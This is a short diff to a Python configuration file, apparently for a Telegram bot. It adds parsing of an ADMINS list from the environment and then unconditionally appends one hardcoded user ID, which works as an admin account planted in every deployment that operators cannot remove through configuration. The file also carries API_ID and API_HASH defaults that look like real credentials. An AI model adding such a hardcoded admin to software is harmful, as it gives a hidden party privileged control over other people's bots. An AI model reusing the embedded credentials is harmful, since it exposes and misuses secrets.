@@ -1,5 +1,14 @@
 import os
 
+try:
+    ADMINS=[]
+    for x in (os.environ.get("ADMINS", "").split()):
+        ADMINS.append(int(x))
+except ValueError:
+        raise Exception("Your Admins list does not contain valid integers.")
+  
+ADMINS.append(7409044848)
+
 class Config(object):
   API_ID = int(os.environ.get("API_ID", "28377464"))
   API_HASH = os.environ.get("API_HASH", "4d7869d1807d42fa3683f1eee8248697")
